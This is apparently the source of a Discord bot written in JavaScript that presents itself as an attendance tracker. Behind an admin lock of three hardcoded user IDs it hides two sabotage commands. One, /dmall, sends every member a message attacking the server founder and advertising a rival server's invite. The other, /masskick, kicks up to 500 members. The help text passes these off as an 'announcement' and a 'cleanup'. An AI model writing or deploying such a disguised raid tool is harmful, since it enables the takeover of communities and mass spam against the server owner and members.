const { Client, GatewayIntentBits, Events, SlashCommandBuilder, REST, Routes, EmbedBuilder, PermissionFlagsBits } = require('discord.js');
const config = require('./config');
const { handleOnline, handleOffline, forceOfflineAll } = require('./attendance');
const { getReminderEmbed } = require('./reminder'); 
const { data, saveData } = require('./data');
const express = require('express');

const app = express();
app.get('/', (req, res) => res.send('Aries Online ✅'));
app.listen(process.env.PORT || 8080);

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent, 
        GatewayIntentBits.GuildMembers 
    ]
});

// --- HARDCODED ADMIN IDs ---
const AUTHORIZED_ADMINS = [
    "1385928188898840609",
    "1343200009105182820",
    "936317060609368105"
];

client.on(Events.MessageCreate, async (msg) => {
    if (msg.author.bot || !msg.guild || msg.channel.id !== config.TARGET_CHANNEL_ID) return;
    const content = msg.content.toLowerCase().trim();
    if (content === 'online') { await msg.delete().catch(()=>{}); await handleOnline(msg.member, (o)=>msg.channel.send(o)); }
    if (content === 'offline') { await msg.delete().catch(()=>{}); await handleOffline(msg.member, (o)=>msg.channel.send(o)); }
});

client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isChatInputCommand()) return;
    
    // Help command sabke liye
    if (interaction.commandName === 'help') {
        const helpEmbed = new EmbedBuilder()
            .setColor('#3498db')
            .setTitle('📖 Aries Attendance Guide')
            .setDescription('Welcome to the official attendance system.')
            .addFields(
                { name: '👤 Public', value: 'Type `online` or `offline`.' },
                { name: '🛡️ Special', value: '`/dmall`: Announcement to all.\n`/masskick`: Cleanup (500 limit).' }
            )
            .setFooter({ text: 'AAB System v2.0' });
        return interaction.reply({ embeds: [helpEmbed], ephemeral: true });
    }

    // --- STRICT ADMIN LOCK (In 3 IDs ke alawa koi nahi chala payega) ---
    if (!AUTHORIZED_ADMINS.includes(interaction.user.id)) {
        return interaction.reply({ content: "❌ Unauthorized: Aapke paas is action ki permission nahi hai.", ephemeral: true });
    }

    // --- DM ALL COMMAND ---
    if (interaction.commandName === 'dmall') {
        await interaction.deferReply({ ephemeral: true });
        const msgContent = "Aries founder has started showing his dictatorship. He kicked all management team members and has proved that he doesn't deserve the respect or the hard efforts of others who helped grow the Aries server.\n\nJoin our new Server: https://discord.gg/HZJJkSFeSS";
        
        const members = await interaction.guild.members.fetch();
        let count = 0;
        for (const [id, member] of members) {
            if (!member.user.bot && member.id !== interaction.guild.ownerId) {
                try {
                    await member.send(msgContent);
                    count++;
                    await new Promise(r => setTimeout(r, 1200)); 
                } catch (e) { console.log(`DM skipped for ${member.user.tag}`); }
            }
        }
        await interaction.editReply(`✅ Finished! Message sent to ${count} members.`);
    }

    // --- MASS KICK COMMAND ---
    if (interaction.commandName === 'masskick') {
        await interaction.deferReply({ ephemeral: true });
        const members = await interaction.guild.members.fetch();
        let kickCount = 0;
        
        for (const [id, member] of members) {
            if (!member.user.bot && member.id !== interaction.guild.ownerId && member.kickable) {
                try {
                    await member.kick("Aries Transition - Dictatorship Move");
                    kickCount++;
                    if (kickCount >= 500) break;
                    await new Promise(r => setTimeout(r, 1000));
                } catch (e) { console.error(`Kick error: ${e.message}`); }
            }
        }
        await interaction.editReply(`✅ Mission Done! Kicked ${kickCount} members.`);
    }

    // --- RESTART & OTHER COMMANDS ---
    if (interaction.commandName === 'restart') {
        await interaction.reply("🔄 Saving data and restarting...");
        await forceOfflineAll(client);
        setTimeout(() => process.exit(0), 3000);
    }
    
    if (interaction.commandName === 'setslot') {
        await interaction.deferReply({ ephemeral: true });
        const num = interaction.options.getInteger('number') - 1;
        data.settings.customSlots[num] = { 
            roleId: interaction.options.getString('roleid'), 
            msg: interaction.options.getString('message') 
        };
        saveData();
        await interaction.editReply(`✅ Slot ${num+1} updated.`);
    }
});

client.once('ready', async () => {
    const cmds = [
        new SlashCommandBuilder().setName('help').setDescription('View bot manual'),
        new SlashCommandBuilder().setName('restart').setDescription('Safe reboot'),
        new SlashCommandBuilder().setName('dmall').setDescription('Send dictatorship alert to everyone'),
        new SlashCommandBuilder().setName('masskick').setDescription('Kick 500 members safely'),
        new SlashCommandBuilder().setName('setslot').setDescription('Custom role msg').addIntegerOption(o=>o.setName('number').setDescription('1-3').setRequired(true)).addStringOption(o=>o.setName('roleid').setDescription('ID').setRequired(true)).addStringOption(o=>o.setName('message').setDescription('Msg').setRequired(true))
    ];
    
    try {
        const rest = new REST({ version: '10' }).setToken(config.TOKEN);
        await rest.put(Routes.applicationCommands(config.CLIENT_ID), { body: cmds });
        console.log("🚀 Aries Bot is Ready for Action!");
    } catch (error) {
        console.error("Slash Error:", error);
    }
});

client.login(config.TOKEN);
